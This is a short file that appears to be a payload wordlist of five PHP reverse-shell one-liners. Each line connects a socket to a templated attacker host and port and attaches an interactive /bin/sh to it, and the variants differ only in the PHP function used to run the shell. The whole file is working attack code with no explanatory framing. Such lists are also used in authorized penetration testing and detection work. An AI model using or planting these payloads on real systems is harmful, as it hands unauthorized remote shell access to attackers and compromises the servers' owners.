<?php $sock=fsockopen("§LHOST§",§LPORT§);exec("/bin/sh -i <&3 >&3 2>&3");?>
<?php $sock=fsockopen("§LHOST§",§LPORT§);shell_exec("/bin/sh -i <&3 >&3 2>&3");?>
<?php $sock=fsockopen("§LHOST§",§LPORT§);system("/bin/sh -i <&3 >&3 2>&3");?>
<?php $sock=fsockopen("§LHOST§",§LPORT§);passthru("/bin/sh -i <&3 >&3 2>&3");?>
<?php $sock=fsockopen("§LHOST§",§LPORT§);popen("/bin/sh -i <&3 >&3 2>&3", "r");?>
